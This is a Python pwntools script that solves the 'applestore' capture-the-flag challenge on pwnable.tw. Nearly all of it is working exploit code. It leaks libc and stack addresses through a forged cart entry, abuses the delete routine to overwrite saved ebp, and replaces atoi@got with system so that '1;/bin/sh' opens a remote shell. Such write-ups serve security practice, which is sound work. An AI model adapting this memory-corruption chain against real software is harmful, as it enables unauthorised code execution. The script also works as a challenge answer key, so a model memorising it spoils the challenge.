#! /usr/bin/python
from pwn import *

def add(device):
	r.sendlineafter('> ','2')
	r.sendlineafter('Device Number> ',str(device))

def cart(data=''):
	r.sendlineafter('> ','4')
	r.sendlineafter('ok? (y/n) > ','y'+data)

def checkout(data=''):
	r.sendlineafter('> ','5')
	r.sendlineafter('ok? (y/n) > ','y')

def delete(index):
	r.sendlineafter('> ','3')
	r.sendlineafter('Item Number> ',str(index))


#r = process('./applestore',env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10104)
libc = ELF('./libc_32.so.6')
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x8048B9d') # b03


##### allocatte stack #####

for i in range(20):
	add('2') # 299

for i in range(6):
	add('1') # 199

checkout()


##### leak libc_addr #####

payload = 'A' # 'y'+'A' dummy [$ebp+0x22]
payload += p32(0x804b00c) # leak read@got.plt
payload += p32(0x00)      # price
payload += p32(0x00)      # next
payload += p32(0x00)      # previous
cart(payload)

r.recvuntil('27: ')
leak = u32(r.recv(4))
libc_base = leak - 868800
success('libc_base = '+hex(libc_base))

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('system_addr = '+hex(system_addr))
log.info('binsh_addr = '+hex(binsh_addr))

environ_addr = libc_base + libc.symbols['environ']
log.info('environ_addr = '+hex(environ_addr))


##### leak stack_addr #####

payload2 = 'A' # 'y'+'A' dummy [$ebp+0x22]
payload2 += p32(environ_addr) # leak stack_addr
payload2 += p32(0x00)         # price
payload2 += p32(0x00)
payload2 += p32(0x00)
cart(payload2)

r.recvuntil('27: ')
leak = u32(r.recv(4))

cart_ebp_addr = leak - 260
target = cart_ebp_addr - 8
success('cart_ebp_addr = '+hex(cart_ebp_addr))


##### ebp overwrite #####

payload3 = '27' # [$ebp+0x22]
payload3 += p32(environ_addr)
payload3 += p32(0x01)
payload3 += p32(0x0804b058) # atoi 0x804b040
payload3 += p32(target)
delete(payload3)


##### atoi@got overwrite #####

payload4 = '\x00'*0x0a
payload4 += p32(system_addr)
payload4 += '1;/bin/sh'
r.sendlineafter('> ',payload4)

r.interactive()

'''
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit

'''